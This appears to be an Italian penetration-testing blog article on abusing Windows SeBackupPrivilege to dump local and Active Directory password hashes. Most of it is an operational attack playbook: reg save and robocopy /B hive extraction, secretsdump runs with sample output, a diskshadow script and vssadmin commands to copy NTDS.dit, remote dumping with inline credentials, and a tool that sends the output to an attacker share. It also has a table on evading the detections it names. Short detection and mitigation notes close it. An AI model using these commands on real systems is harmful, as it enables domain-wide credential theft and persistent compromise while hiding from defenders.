---
title: 'SeBackupPrivilege: dump hash e dominio completo con SAM, SYSTEM e NTDS.dit'
slug: sebackupprivilege
description: >-
  PrivEsc con SeBackupPrivilege su Windows e Active Directory: estrazione di
  SAM, SYSTEM e SECURITY, dump offline con secretsdump, accesso a NTDS.dit e
  impatto reale su domini compromessi.
image: /sebackupprivilege.webp
draft: false
date: 2026-05-26T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - SeBackupPrivilege
  - NTDS.dit
  - active directory
---

Hai le credenziali di un account nel gruppo Backup Operators — niente shell sul DC, niente exploit. Con SeBackupPrivilege e `reg save` estrai SAM, SYSTEM e SECURITY in 30 secondi. Con un account nel gruppo Backup Operators di **dominio**, secretsdump ti consegna tutti gli hash AD direttamente via rete.

***

## Quick Exploit

```cmd
reg save HKLM\SAM C:\temp\sam.hive
reg save HKLM\SYSTEM C:\temp\system.hive
reg save HKLM\SECURITY C:\temp\security.hive
```

Su macchina attaccante:

```bash
python3 secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL
```

Output atteso:

```
Administrator:500:aad3b435...:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

***

## Cos'è SeBackupPrivilege

Il flag `FILE_FLAG_BACKUP_SEMANTICS` permette di aprire un file bypassando completamente la DACL in lettura: il kernel non controlla chi è il proprietario né cosa c'è nella ACL. Nato per i software di backup, in mano a un attaccante diventa accesso diretto a qualsiasi file protetto del sistema.

**Nota:** `reg save` e `robocopy /B` usano le backup API internamente — funzionano anche se il privilegio appare `Disabled` in `whoami /priv`.

Il gruppo **Backup Operators di dominio** ha il privilegio su **tutti i DC del dominio** — un account in quel gruppo può estrarre NTDS.dit via rete senza mai aprire una shell sul DC.

***

## Quando esiste

* **Backup Operators** locale e di dominio
* **Service account Veeam / Acronis / Backup Exec / Windows Server Backup**
* **Server Operators** in Active Directory
* **Account IT** con deleghe di backup esplicite

Verifica:

```cmd
whoami /priv
```

Cerchi:

```
SeBackupPrivilege    Back up files and directories    Enabled
```

Verifica la membership al gruppo:

```cmd
net localgroup "Backup Operators"
```

```cmd
whoami /groups | findstr "Backup"
```

Backup Operators di dominio (esegui da qualsiasi macchina del dominio):

```powershell
Get-ADGroupMember "Backup Operators" -Recursive | Select-Object Name, SamAccountName
```

Chi ha il privilegio nel sistema corrente:

```cmd
accesschk.exe -a SeBackupPrivilege *
```

***

## Step 1 — Estrai SAM, SYSTEM e SECURITY hive

`reg save` è il metodo più diretto. Funziona anche se il privilegio è Disabled:

```cmd
reg save HKLM\SAM C:\temp\sam.hive
```

```cmd
reg save HKLM\SYSTEM C:\temp\system.hive
```

```cmd
reg save HKLM\SECURITY C:\temp\security.hive
```

***

## Step 2 — Estrai gli hash offline

Trasferisci i tre file sulla macchina attaccante e lancia secretsdump:

```bash
python3 secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL
```

Output:

```
[*] Target system bootKey: 0x3c2b033e4f5e4a7e...
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash):
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information:
CORP/DomainAdmin:$DCC2$10240#DomainAdmin#a8c4e5f3...
[*] Dumping LSA Secrets:
_SC_MSSQLSERVER
CORP\svc-sql:SomeServiceP@ss!
```

Hai hash NTLM locali, credenziali domain cached e LSA Secrets (spesso password di servizi in chiaro).

***

## Attack Chain

```
Account Backup Operators compromesso (Veeam / account legacy / password spray)
  → whoami /priv → SeBackupPrivilege Enabled (o Disabled — reg save funziona comunque)
  → reg save HKLM\SAM + SYSTEM + SECURITY → secretsdump LOCAL → hash locali
  oppure
  → secretsdump CORP/backupuser:Pass@DC01 → tutti gli hash AD → KRBTGT → Golden Ticket
```

***

## Tool Decision

| Obiettivo                       | Metodo                                            |
| ------------------------------- | ------------------------------------------------- |
| Hash locali (macchina corrente) | `reg save` → secretsdump LOCAL                    |
| `reg save` monitorato dal SIEM  | `robocopy /B` → stesso risultato, pattern diverso |
| NTDS.dit sul DC (file locked)   | `diskshadow` → robocopy /B → secretsdump          |
| DC remoto, no shell locale      | `secretsdump CORP/user:pass@DC01` direttamente    |
| Automazione completa            | `BackupOperatorToDA.exe`                          |

***

### robocopy /B — alternativa stealth a reg save

Se `reg save` è monitorato dal SIEM o flaggato dall'EDR, `robocopy /B` usa le stesse backup API con un pattern diverso:

```cmd
robocopy /B C:\Windows\System32\config C:\temp sam system security
```

I file vengono copiati in `C:\temp\` con i loro nomi originali. Poi secretsdump come sopra.

### diskshadow — NTDS.dit su DC (file locked)

NTDS.dit è bloccato da Active Directory mentre il DC è in esecuzione. Devi creare una Volume Shadow Copy per accedervi.

Crea il file di script `C:\temp\shadow.txt` con questo contenuto:

```
set context persistent nowriters
add volume C: alias hackita
create
expose %hackita% Z:
exec cmd.exe /c robocopy /B Z:\Windows\NTDS C:\temp ntds.dit
delete shadows volume %hackita%
reset
```

Esegui lo script:

```cmd
diskshadow.exe /s C:\temp\shadow.txt
```

Poi copia il SYSTEM hive (necessario per decifrare):

```cmd
reg save HKLM\SYSTEM C:\temp\system.hive
```

Infine extraction completa del dominio:

```bash
python3 secretsdump.py -ntds C:\temp\ntds.dit -system C:\temp\system.hive LOCAL
```

Output: tutti gli hash del dominio → KRBTGT → Golden Ticket possibile.

### vssadmin — alternativa a diskshadow

Se diskshadow è bloccato da policy GPO, usa vssadmin direttamente:

```cmd
vssadmin create shadow /for=C:
```

L'output mostra il path della shadow copy. Esempio di output:

```
Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```

Usa quel path per copiare i file:

```cmd
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit" C:\temp\ntds.dit
```

```cmd
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" C:\temp\system.hive
```

Poi secretsdump come sopra.

### secretsdump via rete — nessuna shell necessaria sul DC

Se l'account è nel gruppo **Backup Operators di dominio**, secretsdump si connette via SMB autenticato e gestisce tutto remotamente:

```bash
python3 secretsdump.py CORP/backupuser:Password123@DC01.corp.local
```

Se Remote Registry è fermo, avvialo prima:

```bash
python3 services.py CORP/backupuser:Password123@DC01.corp.local start RemoteRegistry
```

Poi rilancia secretsdump. Output: tutti gli hash del dominio incluso KRBTGT.

### BackupOperatorToDA — automazione completa

Automatizza l'intera chain senza passaggi manuali:

```cmd
BackupOperatorToDA.exe \\DC01 \\ATTACKER\share\
```

Source e documentazione: [mpgn/BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA)

***

## Errori comuni

**`reg save` → Access Denied** — Token non elevato (UAC split). Verifica con `whoami /groups | findstr "Mandatory"`. Se vedi Medium Mandatory Level, apri un processo elevato.

**secretsdump via rete → "Registry service not started"** — Remote Registry fermo sul DC. Avvialo con: `python3 services.py CORP/user:pass@DC01 start RemoteRegistry` oppure `sc \\DC01 start RemoteRegistry`.

**SAM e SYSTEM decifrano ma gli hash sembrano vuoti** — I due file sono stati estratti in momenti diversi (boot key cambiata). Ri-estrai entrambi insieme nella stessa sessione.

**diskshadow bloccato da GPO** — Usa `vssadmin create shadow /for=C:` come alternativa. Il path della shadow copy appare nell'output.

***

## Detection e bypass (Red Team view)

| Cosa rileva il Blue Team                       | Come lo bypassa il Red Team                                              |
| ---------------------------------------------- | ------------------------------------------------------------------------ |
| Event ID 4663 — accesso a SAM/NTDS.dit         | Usa `robocopy /B` invece di `reg save` — pattern meno comune nei ruleset |
| Event ID 7036 — VSS avviato fuori orario       | Esegui il dump durante la finestra oraria del backup legittimo           |
| `reg save HKLM\SAM` da account non standard    | Rinomina l'operazione usando API native PowerShell invece di `reg save`  |
| secretsdump via rete — connessione SMB anomala | Esegui da una macchina già nel dominio con IP whitelistato               |

***

## Scenari reali

**Veeam service account** — quasi sempre nel gruppo Backup Operators. Credenziali trovate in un config file o via password spray → `reg save` → hash locali → lateral movement su tutta l'infrastruttura gestita.

**Backup Operators di dominio** — zero shell sul DC. `secretsdump CORP/backupuser:Password@DC01` → tutti gli hash AD → KRBTGT → Golden Ticket.

**Account di backup legacy** — creato anni fa, password che non scade, mai revisionato. Classico finding nei pentest enterprise.

***

## Quando fallisce

* **`reg save` → Access Denied** → token non elevato (UAC split). Verifica con `whoami /groups | findstr "Mandatory"` — Medium Mandatory Level significa che devi elevare.
* **secretsdump via rete → "Registry service not started"** → Remote Registry fermo. Avvialo con `services.py` o `sc \\DC01 start RemoteRegistry`.
* **SAM e SYSTEM estratti in momenti diversi** → la boot key cambia → secretsdump non decifra. Ri-estrai entrambi insieme.
* **diskshadow bloccato da GPO** → usa `vssadmin create shadow` come alternativa.

***

## Detection

* **Event ID 4656**: handle su file con flag `BACKUP_SEMANTICS`
* **Event ID 4663**: accesso a SAM, NTDS.dit, SECURITY hive da account non standard
* **Event ID 7036**: VSS avviato fuori orario backup schedulato
* `reg save HKLM\SAM` eseguito da account non amministrativi

***

## Mitigazioni

* **Limitare il gruppo Backup Operators** con revisione periodica: `Get-ADGroupMember "Backup Operators" -Recursive`
* **Separare Backup Operators locale da Backup Operators di dominio** — impatto completamente diverso
* **gMSA** per i service account di Veeam, Acronis, NetBackup
* Alert su Event ID 4663 per accesso a SAM/NTDS.dit da account non standard

**Nota realistica:** I software di backup enterprise (Veeam, Acronis) richiedono il gruppo Backup Operators per funzionare correttamente. Nella maggior parte dei clienti enterprise, questi account esistono, non vengono revisionati e hanno password che non scadono. Sono tra i target più redditizi in un pentest AD.

***

## FAQ

**Backup Operators di dominio equivale a Domain Admin?**
In pratica sì. Puoi estrarre NTDS.dit, ottenere KRBTGT, creare Golden Ticket. Non puoi modificare oggetti AD direttamente, ma con KRBTGT quella distinzione è accademica.

**`reg save` funziona anche se il privilegio è Disabled?**
Sì — usa le backup API internamente e le attiva autonomamente. Disabled non è un blocco per `reg save` e `robocopy /B`.

**Con SeBackupPrivilege posso anche scrivere file?**
No — solo lettura. Per la scrittura serve [SeRestorePrivilege](04-serestoreprivilege.md). I Backup Operators hanno entrambi per default.

***

SeBackupPrivilege non è escalation locale — è la chiave per tutti gli hash di un dominio Active Directory, raggiungibile senza shell sul DC. Con KRBTGT in mano, il dominio è compromesso indefinitamente fino a un reset doppio della password.

***

**Articoli correlati:**

* [SeRestorePrivilege](https://hackita.it/articoli/serestoreprivilege) — il complemento: scrittura arbitraria bypass ACL
* [SeDebugPrivilege](https://hackita.it/articoli/sedebugprivilege) — credential dump alternativo via memoria LSASS
* [SeMachineAccountPrivilege](https://hackita.it/articoli/semachineaccountprivilege) — altro path verso DA senza privilegi elevati

**Riferimenti:** [BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA) · [Impacket](https://github.com/fortra/impacket) · [Microsoft Docs](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories)

Per valutare l'esposizione reale dei tuoi account di backup: [hackita.it/servizi](https://hackita.it/servizi)
